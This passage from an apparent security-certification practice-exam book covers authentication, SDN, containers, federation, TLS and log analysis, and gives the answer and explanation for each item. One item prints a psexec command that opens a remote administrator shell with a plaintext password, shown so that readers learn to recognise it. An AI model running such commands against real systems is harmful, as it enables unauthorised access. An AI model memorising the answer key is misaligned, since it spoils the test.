    B. The most common factors for multifactor systems today are knowledge factors (like a password) and possession factors, which can include a token, an authenticator application, or a smartcard.
53. Angela's multifactor deployment includes the ability to use text (SMS) messages to send the second factor for authentication. What issues should she point to?

    1. VoIP hacks and SIM swapping.
    2. SMS messages are logged on the recipient's phones.
    3. PIN hacks and SIM swapping.
    4. VoIP hacks and PIN hacks.

    Answer:

    A. NIST has pointed out that SMS is a relatively insecure way of delivering codes as part of a multifactor authentication system. The two most common attacks against SMS message delivery are VoIP hacks, where SMS messages may be delivered to a VoIP system, which can be accessed by an attacker, and SIM swapping attacks, where a SIM card is cloned and SMS messages are also delivered to an attacker.
54. What purpose does the OpenFlow protocol serve in software-defined networks?

    1. It captures flow logs from devices.
    2. It allows software-defined network controllers to push changes to devices to manage the network.
    3. It sends flow logs to flow controllers.
    4. It allows devices to push changes to SDN controllers to manage the network.

    Answer:

    B. OpenFlow is used to allow software-defined network (SDN) controllers to push changes to switches and routers, allowing flow control, network traffic partitioning, and testing of applications and configurations.
55. Rick's security research company wants to gather data about current attacks and sets up a number of intentionally vulnerable systems that allow his team to log and analyze exploits and attack tools. What type of environment has Rick set up?

    1. A tarpit
    2. A honeypot
    3. A honeynet
    4. A blackhole

    Answer:

    C. Rick's team has set up a honeynet—a group of systems set up to attract attackers while capturing the traffic they send and the tools and techniques they use. A honeypot is a single system set up in a similar way, whereas a tarpit is a system set up to slow down attackers. A blackhole is often used on a network as a destination for traffic that will be silently discarded.
56. Kalea wants to prevent DoS attacks against her serverless application from driving up her costs when using a cloud service. What technique is _not_ an appropriate solution for her need?

    1. Horizontal scaling
    2. API keys
    3. Setting a cap on API invocations for a given timeframe
    4. Using timeouts

    Answer:

    A. Scaling a serverless system is a useful way to handle additional traffic but will not prevent denial-of-service (DoS) attacks from driving additional cost. In fact, horizontal scaling will add additional costs as it scales. API keys can be used to prevent unauthorized use of the serverless application, and keys can be deprovisioned if they are abused. Capping API invocations and using timeouts can help limit the maximum number of uses and how much they are used, both of which can help prevent additional costs.
57. What is the key difference between virtualization and containerization?

    1. Virtualization gives operating systems direct access to the hardware, whereas containerization does not allow applications to directly access the hardware.
    2. Virtualization lets you run multiple operating systems on a single physical system, whereas containerization lets you run multiple applications on the same system.
    3. Virtualization is necessary for containerization, but containerization is not necessary for virtualization.
    4. There is not a key difference; they are elements of the same technology.

    Answer:

    B. Virtualization allows you to run multiple operating systems on the same underlying hardware, whereas containerization lets you deploy multiple applications on the same operating system on a single system. Containerization can allow direct hardware access, whereas virtualization typically does not. Virtualization is not necessary for containerization, although it is often used, but containerization can get performance improvements from bare-metal installations. Finally, there is a key difference, as noted in option B.
58. Brandon is designing the hosting environment for containerized applications. Application group A has personally identifiable information, application group B has health information with different legal requirements for handling, and application group C has business-sensitive data handling requirements. What is the most secure design for his container orchestration environment given the information he has?

    1. Run a single, highly secured container host with encryption for data at rest.
    2. Run a container host for each application group and secure them based on the data they contain.
    3. Run a container host for groups A and B, and run a lower-security container host for group C.
    4. Run a container host for groups A and C, and run a health information–specific container host for group B due to the health information it contains.

    Answer:

    B. Workloads in a secure containerization environment should be distributed in a way that allows hosts to run containers of only a specific security level. Since Brandon has three different security levels in his environment, he should use separate hosts that can be configured to secure the data appropriately while also limiting the impact if a container is breached.
59. Local and domain administrator accounts, root accounts, and service accounts are all examples of what type of account?

    1. Monitored accounts
    2. Privileged accounts
    3. Root accounts
    4. Unprivileged accounts

    Answer:

    B. Privileged accounts typically include local and domain administrators, SA (system administrator in SQL), and other accounts that manage databases, root accounts, and other administrative accounts on Linux and Unix systems, service accounts, and similar accounts on network and other devices.
60. Ned has discovered a key logger plugged into one of his workstations, and he believes that an attacker may have acquired usernames and passwords for all of the users of a shared workstation. Since he does not know how long the keylogger was in use or if it was used on multiple workstations, what is his best security option to prevent this and similar attacks from causing issues in the future?

    1. Multifactor authentication
    2. Password complexity rules
    3. Password lifespan rules
    4. Prevent the use of USB devices

    Answer:

    A. If Ned implements multifactor authentication for his environment, he can use security tokens or other one-time password (OTP) options to ensure that attackers will not be able to use stolen credentials successfully even if passwords are exposed. Password complexity rules won't help with a keylogger, and expiring passwords with lifespan rules can limit how long the attacker can use them, but even with very short lifespans the attacker may still have them available for some time. Finally, preventing USB devices from being plugged in can help, but software keyloggers won't be caught or prevented by this solution.
61. Facebook Connect, CAS, Shibboleth, and AD FS are all examples of what type of technology?

    1. Kerberos implementations
    2. Single sign-on implementations
    3. Federation technologies
    4. OAuth providers

    Answer:

    B. All of these are examples of single sign-on (SSO) implementations. They allow a user to use a single set of credentials to log in to multiple different services and applications. When federated, SSO can also allow a single account to work across a variety of services from multiple organizations.
62. Which of the following is _not_ a common identity protocol for federation?

    1. SAML
    2. OpenID
    3. OAuth
    4. Kerberos

    Answer:

    D. SAML, OpenID, and OAuth are all common protocols used for federation. Kerberos is a network authentication protocol largely used inside organizations.
63. Naomi wants to enforce her organization's security policies on cloud service users. What technology is best suited to this?

    1. OAuth
    2. CASB
    3. OpenID
    4. DMARC

    Answer:

    B. A cloud access security broker (CASB) can perform actions such as monitoring activity, managing cloud security policies for SaaS services, enforcing security policies, logging, alerting, and in-line policy enforcement when deployed with agents on endpoint devices or as a proxy.
64. Elliott wants to encrypt data sent between his servers. What protocol is most commonly used for secure web communications over a network?

    1. TLS
    2. SSL
    3. IPsec
    4. PPTP

    Answer:

    A. Transport Layer Security (TLS) is used to secure web and other types of traffic. Many people still call TLS SSL out of habit, but TLS is actually a different protocol and has replaced Secure Sockets Layer (SSL). IPsec is an encryption protocol used for VPNs and other point-to-point connections between networks. Point-to-Point Tunneling Protocol (PPTP) has a number of security issues.
65. What occurs when a website's certificate expires?

    1. Web browsers will report an expired certificate to users.
    2. The website will no longer be accessible.
    3. The certificate will be revoked.
    4. All of the above.

    Answer:

    A. TLS can still work with an expired certificate; however, web browsers will report that the certificate is expired. Expired certificates are not revoked—in fact, revocation is a separate process, and certificates are checked against a certificate revocation protocol to ensure that they are valid. Although browsers may report an expired certificate and may make it harder to access the site, the website itself will remain accessible.
66. What term is used to describe defenses that obfuscate the attack surface of an organization by deploying decoys and attractive targets to slow down or distract an attacker?

    1. An active defense
    2. A honeyjar
    3. A bear trap
    4. An interactive defense

    Answer:

    A. Active defenses are aimed at slowing down attackers while using their resources. The rest of the terms listed here were made up for this question. Active defenses are sometimes referred to as _deception technology_.
67. What technology is most commonly used to protect data in transit for modern web applications?

    1. VPN
    2. TLS
    3. SSL
    4. IPsec

    Answer:

    B. Transport Layer Security (TLS) is the security protocol used to protect modern web traffic in transit. SSL was the precursor to TLS, whereas VPN technology is used in specific point-to-point scenarios when connecting to remote services or networks. IPsec is a secure network protocol suite, but it is not the most common option in use for web traffic.
68. Anja is assessing the security of a web service implementation. Which of the following web service security requirements should she recommend to reduce the likelihood of a successful on-path/man-in-the-middle attack?

    1. Use TLS.
    2. Use XML input validation.
    3. Use XML output validation.
    4. Virus-scan files received by web service.

    Answer:

    A. Using TLS will help to ensure that a third party is unable to insert itself into the message stream. TLS can be used to authenticate the service provider and service consumer while also providing message confidentiality, message integrity protection, and replay defenses.
69. What type of access is typically required to compromise a physically isolated and air-gapped system?

    1. Wired network access
    2. Physical access
    3. Wireless network access
    4. None of the above, because an isolated, air-gapped system cannot be accessed

    Answer:

    B. Physical access is the best (and often only) way to compromise an air-gapped, physically isolated system. Although some esoteric attack methods can gather information via RF, acoustic, or other leakage, real-world scenarios will require physical access in almost all cases.
70. Amanda's organization uses an air-gap design to protect the HSM device that stores its root encryption certificate. How will Amanda need to access the device if she wants to generate a new certificate?

    ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf008.jpg)

    1. Wirelessly from her laptop
    2. Over the wired network from her PC
    3. From a system on the air-gapped network
    4. Amanda cannot access the device without physical access to it

    Answer:

    C. Amanda needs to use a system or device on the air-gapped network to access the HSM. This provides isolation, preventing misconfiguration or other security issues from causing the device to be compromised.
71. Which of the following parties directly communicate with the end user during a SAML transaction?

    1. The relying party
    2. The SAML identity provider
    3. Both the relying party and the identity provider
    4. Neither the relying party nor the identity provider

    Answer:

    C. In a SAML transaction, the user initiates a request to the relying party, who then redirects the user to the SSO provider. The user then authenticates to the SAML identity provider and receives a SAML response, which is sent to the relying party as proof of identity.
72. Support for AES, 3DES, ECC, and SHA-256 are all examples of what?

    1. Encryption algorithms
    2. Hashing algorithms
    3. Processor security extensions
    4. Bus encryption modules

    Answer:

    C. These are all examples of processor security extensions providing additional cryptographic instructions. Since AES, 3DES, and ECC are all encryption algorithms and SHA-256 is a hashing algorithm, we know that this can't be either of the first two options alone. Bus encryption may use these, but they aren't just examples of bus encryption algorithms.
73. Which of the following is _not_ a benefit of physical segmentation?

    1. Easier visibility into traffic
    2. Improved network security
    3. Reduced cost
    4. Increased performance

    Answer:

    C. Although physical segmentation can make it easier to see specific traffic while providing better network security and increased performance, running a separate infrastructure is rarely a less expensive option.
74. Which of the following options is most effective in preventing known password attacks against a web application?

    1. Account lockouts
    2. Password complexity settings
    3. CAPTCHAs
    4. Multifactor authentication

    Answer:

    D. Multifactor authentication is the most effective option because attackers will need to present both factors. Even if they know the password, unless they have the second factor their attempt to access the application will fail. Account lockouts and CAPTCHAs can be useful when attempting to prevent brute-force attacks, and complexity settings may make some brute-force attacks slower and harder to conduct.
75. Which of the following is _not_ a common use case for network segmentation?

    1. Creating a VoIP network
    2. Creating a shared network
    3. Creating a guest wireless network
    4. Creating trust zones

    Answer:

    B. Segmented networks are almost always used to isolate groups rather than to combine them. Common uses include specific network segments for VoIP, wireless, or specific trust zones and levels.
76. What three layers make up a software-defined network?

    1. Application, Datagram, and Physical layers
    2. Application, Control, and Infrastructure layers
    3. Control, Infrastructure, and Session layers
    4. Data link, Presentation, and Transport layers

    Answer:

    B. Software-defined networks (SDNs) consist of three major layers: the application layer, where information about the network is used to improve flow, configuration, and other items; the control layer, which is where the logic from SDN controllers control the network infrastructure; and the infrastructure layer, which is made up of the networking equipment. If you're not deeply familiar with SDNs, you can address questions like this by reviewing what you do know. The other three options contain elements of the OSI model but don't make sense in the context of SDN.
77. Micah is designing a containerized application security environment and wants to ensure that the container images he is deploying do not introduce security issues due to vulnerable applications. What can he integrate into the CI/CD pipeline to help prevent this?

    1. Automated checking of application hashes against known good versions
    2. Automated vulnerability scanning
    3. Automated fuzz testing
    4. Automated updates

    Answer:

    B. If Micah implements automated vulnerability scanning, he can check to see if the applications that are about to be deployed have known vulnerabilities. Automated patching will also help with this, but will only apply available patches and will not assess whether there are configuration vulnerabilities or unpatched vulnerabilities. Fuzz testing can help to test if the applications have issues with unexpected input but will not address most vulnerabilities, and hashing will only tell him if he is running the version of code that he expects to, not if it is vulnerable.
78. Camille wants to integrate with a federation. What will she need to authenticate her users to the federation?

    1. An IDP
    2. A SP
    3. An API gateway
    4. An SSO server

    Answer:

    A. Camille will need to integrate her identity provider (IDP) to provide authentication and authorization. Once users are authenticated, they can use various service providers throughout the federation. She will also probably want to use some form of single sign-on (SSO) service, but it is not required to be part of a federation.
79. Brandon needs to deploy containers with different purposes, data sensitivity levels, and threat postures to his container environment. How should he group them?

    1. Segment containers by purpose
    2. Segment containers by data sensitivity
    3. Segment containers by threat model
    4. All of the above

    Answer:

    D. Where possible, NIST recommends segmenting by purpose, data sensitivity, and threat model to separate OS kernels.
80. What issues should Brandon consider before choosing to use the vulnerability management tools he has in his non-container-based security environment?

    1. Vulnerability management tools may make assumptions about host durability.
    2. Vulnerability management tools may make assumptions about update mechanisms and frequencies.
    3. Both A and B.
    4. Neither A nor B.

    Answer:

    C. The NIST 800-190 guidelines note that traditional vulnerability management tools may make assumptions like those in options A and B regarding the systems and applications they are scanning. Since containers are ephemeral and may be updated and changed very frequently, a traditional vulnerability scanning and management approach is likely to be a poor fit for a containerized environment.
81. What key functionality do enterprise privileged account management tools provide?

    1. Password creation
    2. Access control to individual systems
    3. Entitlement management across multiple systems
    4. Account expiration tools

    Answer:

    C. The most distinctive feature of privileged account management tools for enterprise use is the ability to manage entitlements across multiple systems throughout an enterprise IT environment. Broader identity and access management systems for enterprises provide user account management and life-cycle services, including account expiration tools and password life-cycle management capabilities.
82. Amira wants to deploy an open standard–based single sign-on (SSO) tool that supports both authentication and authorization. What open standard should she look for if she wants to federate with a broad variety of identity providers and service providers?

    1. LDAP
    2. SAML
    3. OAuth
    4. OpenID Connect

    Answer:

    B. SAML provides all of the capabilities Amira is looking for. Unlike SAML, OAuth is an authorization standard, not an authentication standard. LDAP provides a directory and can be used for authentication but would need additional tools to be used as described. Finally, OpenID Connect is an authentication layer on top of OAuth, which is an authorization framework. Together, they would also meet the needs described here, but individually they do not.
83. Adam is testing code written for a client-server application that handles financial information and notes that traffic is sent between the client and server via TCP port 80. What should he check next?

    1. If the server stores data in unencrypted form
    2. If the traffic is unencrypted
    3. If the systems are on the same network
    4. If usernames and passwords are sent as part of the traffic

    Answer:

    B. Adam knows that TCP/80 is the normal port for unencrypted HTTP traffic. As soon as he sees the traffic, he should immediately check if the traffic is unencrypted. If it is, his first recommendation will likely be to switch to TLS encrypted traffic. Once that is complete, he can worry about whether data is encrypted at rest and if usernames and passwords are passed as part of the traffic, which might be acceptable if it was protected with TLS!
84. Faraj wants to use statistics gained from live analysis of his network to programmatically change its performance, routing, and optimization. Which of the following technologies is best suited to his needs?

    1. Serverless
    2. Software-defined networking
    3. Physical networking
    4. Virtual private networks (VPNs)

    Answer:

    B. Software-defined networking (SDN) is designed to handle changing traffic patterns and use of data to drive network configurations, routing, and optimization efforts. Faraj's best option is to use a software-defined network. Serverless is a technology that runs compute runtimes rather than a network, and a VPN is used to connect networks or systems together via a private channel.
85. Elaine's team has deployed an application to a cloud-hosted serverless environment. Which of the following security tools can she use in that environment?

    1. Endpoint antivirus
    2. Endpoint DLP
    3. IDS for the serverless environment
    4. None of the above

    Answer:

    D. Serverless environments are a shared service, and since there is not a system that is accessible to consumers, there is nowhere to install endpoint tools. Similarly, network IPSs cannot be placed in front of a shared resource. Elaine should also be aware that any flaw with the underlying serverless environment will likely impact all of the service hosting systems.
86. Lucca needs to explain the benefits of network segmentation to the leadership of his organization. Which of the following is _not_ a common benefit of segmentation?

    1. Decreasing the attack surface
    2. Increasing the number of systems in a network segment
    3. Limiting the scope of regulatory compliance efforts
    4. Increasing availability in the case of an issue or attack

    Answer:

    B. Segmentation is typically used to decrease the number of systems in a network segment, rather than to increase it. Segmentation is often used to decrease an organization's attack surface by moving systems that don't need to be exposed to a protected segment. It can also be used to limit compliance impact by removing systems from a compliance zone that do not need to be part of it. Finally, limiting the number of systems or devices in segment or keeping potentially problematic systems in an isolated network segment can help increase availability.
87. Kubernetes and Docker are examples of what type of technology?

    1. Encryption
    2. Software-defined networking
    3. Containerization
    4. Serverless

    Answer:

    C. Kubernetes and Docker are both examples of containerization tools.
88. Nathan is designing the logging infrastructure for his company and wants to ensure that a compromise of a system will not result in the loss of that system's logs. What should he do to protect the logs?

    1. Limit log access to administrators.
    2. Encrypt the logs.
    3. Rename the log files from their common name.
    4. Send the logs to a remote server.

    Answer:

    D. Nathan's best option is to send the logs to a remote server. The server should be protected to ensure that the same exploits that might compromise other systems will not impact the secure log storage server or service. In many organizations, a SIEM device or security logging tool like ELK or Splunk may be used to store and work with these logs.
89. Ansel knows he wants to use federated identities in a project he is working on. Which of the following should not be among his choices for a federated identity protocol?

    1. OpenID
    2. SAML
    3. OAuth
    4. Authman

    Answer:

    D. OpenID, SAML, and OAuth are all commonly used protocols for federated identity. Ansel will need to better understand what the use cases for federated identity are in his environment and which organizations he will federate with before he chooses a protocol to implement and may eventually need to support more than one. Authman is a tool used to manage web user login files and is not a protocol.
90. James uploads a file that he believes is potentially a malware package to VirusTotal and receives positive results, but the file is identified with multiple different malware package names. What has most likely occurred?

    1. The malware is polymorphic and is being identified as multiple viruses because it is changing.
    2. Different antimalware engines call the same malware package by different names.
    3. VirusTotal has likely misidentified the malware package, and this is a false positive.
    4. The malware contains multiple malware packages, resulting in the matches.

    Answer:

    B. Sites like VirusTotal run multiple antimalware engines, which may use different names for malware packages. This can result in a malware package apparently matching multiple different infections.
91. Isaac wants to monitor live memory usage on a Windows system. What tool should he use to see memory usage in a graphical user interface?

    1. MemCheck
    2. Performance Monitor
    3. WinMem
    4. Top

    Answer:

    B. The Windows Performance Monitor (`perfmon.exe`) provides a live view of memory usage per running application or service. This can be useful for live memory analysis. MemCheck and WinMem were made up for this question, and `top` is a useful Linux tool for checking memory utilization. If you aren't familiar with tools like this, you may want to spend some time with Windows and Linux common command cheat sheets like the Linux sheet found at [`www.linuxtrainingacademy.com/linux-commands-cheat-sheet`](http://www.linuxtrainingacademy.com/linux-commands-cheat-sheet).
92. Abul wants to identify typical behavior on a Windows system using a built-in tool to understand memory, CPU, and disk utilization. What tool can he use to see both real-time performance and over a period of time?

    1. `sysmon`
    2. `sysgraph`
    3. `resmon`
    4. `resgraph`

    Answer:

    C. The Windows Resource Monitor (`resmon.exe`) application is a useful tool to both see real-time data and graph it over time, allowing Abul to watch for spikes and drops in usage that may indicate abnormal behavior.
93. The automated malware analysis tool that Jose is using uses a disassembler and performs binary diffing across multiple malware binaries. What information is the tool looking for?

    1. Calculating minimum viable signature length
    2. Binary fingerprinting to identify the malware author
    3. Building a similarity graph of similar functions across binaries
    4. Heuristic code analysis of development techniques

    Answer:

    C. Binary diffing looks at multiple potentially related binaries that have anti-reverse-engineering tools run on them and looks for similarities. Graphs map this data, helping the tool identify malware families despite the protections that malware authors bake in. As you might have guessed, the rest of the answers for this question were made up.
94. What does execution of `wmic.exe`, `powershell.exe`, or `winrm.vbs` most likely indicate if you discover one or more was run on a typical end user's workstation?

    1. A scripted application installation
    2. Remote execution of code
    3. A scripted application uninstallation
    4. A zero-day attack

    Answer:

    B. PowerShell, `wmic`, and `winrm.vbs` are all commonly used for remote execution of code or scripts, and finding them in use on a typical workstation should cause you to be worried as most users will never use any of the three.
95. Ben is reviewing network traffic logs and notices HTTP and HTTPS traffic originating from a workstation. What TCP ports should he expect to see this traffic sent to under most normal circumstances?

    1. 80 and 443
    2. 22 and 80
    3. 80 and 8088
    4. 22 and 443

    Answer:

    A. Most common HTTP traffic will go to port 80, and HTTPS traffic will go to 443. The third most common port for web traffic is 8080 and would be a reasonable but significantly less common option. While other ports may be in use, if you aren't expecting traffic to nonstandard HTTP and HTTPS ports, you may want to investigate the traffic.
96. While Lucy is monitoring the SIEM, she notices that all of the log sources from her organization's New York branch have stopped reporting for the past 24 hours. What type of detection rules or alerts should she configure to make sure she is aware of this sooner next time?

    1. Heuristic
    2. Behavior
    3. Availability
    4. Anomaly

    Answer:

    C. Availability analysis targets whether a system or service is working as expected. Although a SIEM may not have direct availability analysis capabilities, reporting on when logs or other data is not received from source systems can help detect outages. Ideally, Lucy's organization should be using a system monitoring tool that can alarm on availability issues as well as common system problems such as excessive memory, network, disk, or CPU usage.
97. After her discovery in the previous question, Lucy is tasked with configuring alerts that are sent to system administrators. She builds a rule that can be represented in pseudocode as follows:

    Send an SMS alert every 30 seconds when systems do not send logs for more than 1 minute.

    The average administrator at Lucy's organization is responsible for 150–300 machines.

    What danger does Lucy's alert create?

    1. A DDoS that causes administrators to not be able to access systems
    2. A network outage
    3. Administrators may ignore or filter the alerts
    4. A memory spike

    Answer:

    C. When faced with massive numbers of notification messages that are sent too aggressively, administrators are likely to ignore or filter the alerts. Once they do, they are unlikely to respond to actual issues, causing all of the advantages of monitoring to be lost. If she doesn't spend some time identifying reasonable notification thresholds and frequencies, Lucy's next conversation is likely to be with an angry system administrator or manager.
98. Lucy configures an alert that detects when users who do not typically travel log in from other countries. What type of analysis is this?

    1. Trend
    2. Availability
    3. Heuristic
    4. Behavior

    Answer:

    D. Lucy has configured a behavior-based detection. It is likely that a reasonable percentage of the detections will be legitimate travel for users who typically do not leave the country, but pairing this behavioral detection with other behavioral or anomaly detections can help determine if the login is legitimate.
99. Disabling unneeded services is an example of what type of activity?

    1. Threat modeling
    2. Incident remediation
    3. Proactive risk assessment
    4. Reducing the threat attack surface area

    Answer:

    D. Disabling unneeded or risky services is an example of a strategy to reduce the attack surface area of a system or device. Threat modeling and proactive risk assessment are both activities that focus on preparation, rather than direct systems or technology action, and incident remediation might involve disabling a service, but there isn't enough information to know this for sure. What we do know for sure is that disabling unneeded services reduces the attack surface area for a system.
100.    Suki notices inbound traffic to a Windows system on TCP port 3389 on her corporate network. What type of traffic is she most likely seeing?

        1. A NetBIOS file share
        2. A RADIUS connection
        3. An RDP connection
        4. A Kerberos connection

        Answer:

        C. RDP operates over TCP 3389. Most corporate workstations won't have RDP turned on inbound to workstations, and Suki may find that she has discovered a compromise or other behavior that her organization may not want to occur.
101.    Ian wants to capture information about privilege escalation attacks on a Linux system. If he believes that an insider is going to exploit a flaw that allows them to use `sudo` to assume root privileges, where is he most likely to find log information about what occurred?

        1. The `sudoers` file
        2. `/var/log/sudo`
        3. `/var/log/auth.log`
        4. Root's `.bash_log`

        Answer:

        C. The `auth.log` file on Linux systems will capture `sudo` events. A knowledgeable attacker is likely to erase or modify the `auth.log` file, so Ian should make sure that the system is sending these events via syslog to a trusted secure host. The `sudoers` file stored in `/etc/sudoers` contains details of which users can use `sudo` and what rights they have. There is not a file called `/var/log/sudo`, and root's `.bash_log` file might contain commands that root has run but won't have details of the `sudo` event—there's no reason for root to `sudo` to root!
102.    What type of information can Gabby determine from Tripwire logs on a Linux system if it is configured to monitor a directory?

        1. How often the directory is accessed
        2. If files in the directory have changed
        3. If sensitive data was copied out of the directory
        4. Who has viewed files in the directory

        Answer:

        B. Tripwire can monitor files and directories for changes, which means Gabby can use it to monitor for files in a directory that have changed. It will not tell you how often the directory is accessed, who viewed files, or if sensitive data was copied out of the directory.
103.    While reviewing systems she is responsible for, Charlene discovers that a user has recently run the following command in a Windows console window. What has occurred?

        `psexec \\10.0.11.1 -u Administrator -p examplepw cmd.exe`

        1. The user has opened a command prompt on their workstation.
        2. The user has opened a command prompt on the desktop of a remote workstation.
        3. The user has opened an interactive command prompt as administrator on a remote workstation.
        4. The user has opened a command prompt on their workstation as Administrator.

        Answer:

        C. Even if you're not familiar with the PS tools, you can use your knowledge of Windows command-line tools to figure out what is happening here. We see a remote workstation (it is highly unlikely you would connect to your own workstation this way!) indicated by the `\\ip.address`, a `-u` flag likely to mean user ID with the administrator listed, and a `-p` for password. We know that `cmd.exe` is the Windows command prompt, so it is reasonable and correct to assume that this will open a remote command prompt for interactive use. If this is a user who isn't an administrator, Charlene needs to start an incident investigation right away.
104.    While reviewing `tcpdump` data, Kwame discovers that hundreds of different IP addresses are sending a steady stream of SYN packets to a server on his network. What concern should Kwame have about what is happening?

        1. A firewall is blocking connections from occurring.
        2. An IPS is blocking connections from occurring.
        3. A denial-of-service attack.
        4. An ACK blockage.

        Answer:

        C. SYN floods are a denial-of-service attack technique that is used to exhaust session handlers on systems. A flood of SYNs from many different IP addresses without a completed TCP three-way handshake is often a sign of a SYN flood attack.
105.    While reviewing Windows event logs for a Windows system with reported odd behavior, Kai discovers that the system she is reviewing shows `Event ID 1005 MALWAREPROTECTION_SCAN_FAILED` every day at the same time. What is the most likely cause of this issue?

        1. The system was shut down.
        2. Another antivirus program has interfered with the scan.
        3. The user disabled the scan.
        4. The scan found a file it was unable to scan.

        Answer:

        B. First, Kai should check the scan log to review the scan type and error code to check it via the Microsoft support site. The most likely cause from the list of provided answers is a conflict with another security product. While security practitioners often worry about malware on systems, a common cause of scan failures is a second installed antivirus package. If Kai doesn't find a second antivirus package installed, she should conduct a scan using another tool to see if malware may be the issue.
106.    Charles wants to use his SIEM to automatically flag known bad IP addresses. Which of the following capabilities is not typically used for this with SIEM devices?

        1. Blocklisting
        2. IP reputation
        3. Allowlisting
        4. Domain reputation

        Answer:

        C. Blocklisting known bad IP addresses (previously known as blacklisting), as well as the use of both domain and IP reputation services, can help Charles accomplish his task. Allowlisting (previously known as whitelisting) allows only known addresses through and does not flag known bad addresses.
107.    Gabby executes the following command. What is she doing?

        `ps -aux | grep apache2 | grep root`

        1. Searching for all files owned by root named `apache2`.
        2. Checking currently running processes with the word `apache2` and root both appearing in the output of `ps`.
        3. Shutting down all `apache2` processes run by root.
        4. There is not enough information to answer this question.

        Answer:

        B. The `ps` utility lists currently running processes, and `aux` is a set of flags that control which processes are selected. This output is then piped to `grep`, and all lines with the text `apache2` will be selected. Then that list will be searched for the text root. This type of multiple piping can help quickly process large volumes of files and thousands or millions of lines of text.
108.    While reviewing email headers, Saanvi notices an entry that reads as follows:

        From: “John Smith, CIO” <[`jsmith@example.com`](mailto:jsmith@example.com)> with a Received: parameter that shows `mail.demo.com` \[10.74.19.11].

        Which of the following scenarios is most likely if [`demo.com`](http://demo.com/) is not a domain belonging to the same owner as [`example.com`](http://example.com/)?

        1. John Smith's email was forwarded by someone at [`demo.com`](http://demo.com/).
        2. John Smith's email was sent to someone at [`demo.com`](http://demo.com/).
        3. The headers were forged to make it appear to have come from John Smith.
        4. The `mail.demo.com` server is a trusted email forwarding partner for [`example.com`](http://example.com/).

        Answer:

        C. The most likely scenario in this circumstance is that the headers were forged to make the email appear to come from [`example.com`](http://example.com/), but the email was actually sent from `mail.demo.com`.
109.    Fiona wants to prevent email impersonation of individuals inside her company. What technology can best help prevent this?

        1. IMAP
        2. SPF
        3. DKIM
        4. DMARC

        Answer:

        D. While SPF and DKIM can help, combining them in the form of DMARC can limit trusted senders to only a known list and prove that the domain is the domain that is sending the email; this prevents email impersonation when other organizations also use DMARC.
110.    Which of the items from the following list is not typically found in an email header?

        1. Sender IP address
        2. Date
        3. Receiver IP address
        4. Private key

        Answer:

        D. Email headers contain the message ID, date, to, from, user agent, IP addresses of both the sender and the receiver, and information about the email servers along the path between them. They do not contain a private key.
111.    Ian wants to leverage multiple threat flows and is frustrated that they come in different formats. What type of tool might best assist him in combining this information and using it to further streamline his operations?

        1. IPS
        2. OCSP
        3. SOAR
        4. SAML

        Answer:

        C. Security orchestration, automation, and response (SOAR) systems are designed to correlate information and may be able to combine this information. This is especially true if the system and feeds make use of the Structured Threat Information Expression language (STIX) and TAXII, the protocol used to transfer threat intelligence. STIX and TAXII are open protocols that have been adopted to allow multiple threat sources to be combined effectively. SAML is Security Assertion Markup Language, and OCSP is Online Certificate Status Protocol. Neither of those is useful in processing threat information.
112.    Cassandra is classifying a threat actor, and she describes the actor as wanting to steal nuclear research data. What term best describes this information?

        1. An alias
        2. A goal
        3. Their sophistication
        4. Their resource level

        Answer:

        B. The thing that a threat actor wants to do is a goal. Since you might be unfamiliar with some of these terms, when you encounter a question like this, you should rule out what you can. Most questions will have one or more obviously incorrect answers—here that's likely their resource level and their alias. If you ruled only those two out, you'd have a 50 percent chance of getting a question like this right. In this case, you can likely then guess that wanting to steal nuclear research data is a goal, rather than a statement of sophistication, and move on with the next question.
113.    During a log review, Mei sees repeated firewall entries, as shown here:

        `Sep 16 2019 23:01:37: %ASA-4-106023: Deny tcp src outside:10.10.0.100/53534 dst inside:192.168.1.128/1521 by access-group "OUTSIDE" [0x5063b82f, 0x0] Sep 16 2019 23:01:38: %ASA-4-106023: Deny tcp src outside:10.10.0.100/53534 dst inside:192.168.1.128/1521 by access-group "OUTSIDE" [0x5063b82f, 0x0] Sep 16 2019 23:01:39: %ASA-4-106023: Deny tcp src outside:10.10.0.100/53534 dst inside:192.168.1.128/1521 by access-group "OUTSIDE" [0x5063b82f, 0x0] Sep 16 2019 23:01:40: %ASA-4-106023: Deny tcp src outside:10.10.0.100/53534 dst inside:192.168.1.128/1521 by access-group "OUTSIDE" [0x5063b82f, 0x0]`

        What service is the remote system most likely attempting to access?

        1. H.323
        2. SNMP
        3. MS-SQL
        4. Oracle

        Answer:

        D. Oracle databases default to TCP port 1521. Traffic from the “outside” system is being denied when it attempts to access an internal system via that port.
114.    While analyzing a malware file that she discovered, Tracy finds an encoded file that she believes is the primary binary in the malware package. Which of the following is _not_ a type of tool that the malware writers may have used to obfuscate the code?

        1. A packer
        2. A crypter
        3. A shuffler
        4. A protector

        Answer:

        C. Packers, or runtime packers, are tools that self-extract when run, making the code harder to reverse-engineer. Crypters may use actual encryption or simply obfuscate the code, making it harder to interpret or read. Protectors are software that is intended to prevent reverse engineering and often include packing and encryption techniques as well as other protective technologies. Shufflers were made up for this question.
115.    While reviewing Apache logs, Nara sees the following entries as well as hundreds of others from the same source IP address. What should Nara report has occurred?

        `[ 21/Jul/2019:02:18:33 -0500] - - 10.0.1.1 "GET /scripts/sample.php" "-" 302 336 0 [ 21/Jul/2019:02:18:35 -0500] - - 10.0.1.1 "GET /scripts/test.php" "-" 302 336 0[ 21/Jul/2019:02:18:37 -0500] - - 10.0.1.1 "GET /scripts/manage.php" "-" 302 336 0 [ 21/Jul/2019:02:18:38 -0500] - - 10.0.1.1 "GET /scripts/download.php" "-" 302 336 0 [ 21/Jul/2019:02:18:40 -0500] - - 10.0.1.1 "GET /scripts/update.php" "-" 302 336 0 [ 21/Jul/2019:02:18:42 -0500] - - 10.0.1.1 "GET /scripts/new.php" "-" 302 336 0`

        1. A denial-of-service attack
        2. A vulnerability scan
        3. A port scan
        4. A directory traversal attack

        Answer:

        B. Testing for common sample and default files is a common tactic for vulnerability scanners. Nara can reasonably presume that her Apache web server was scanned using a vulnerability scanner.
116.    Andrea needs to add a firewall rule that will prevent external attackers from conducting topology gathering reconnaissance on her network. Where in the following image should she add a rule intended to block this type of traffic?

        ![](https://cdn2.percipio.com/1713091581.af3c25110d5be87c964ff1f58db3e061c5d018ae/eod/books/165333/images/c01uf009.jpg)

        1. The firewall
        2. The router
        3. The distribution switch
        4. The Windows 2019 server

        Answer:

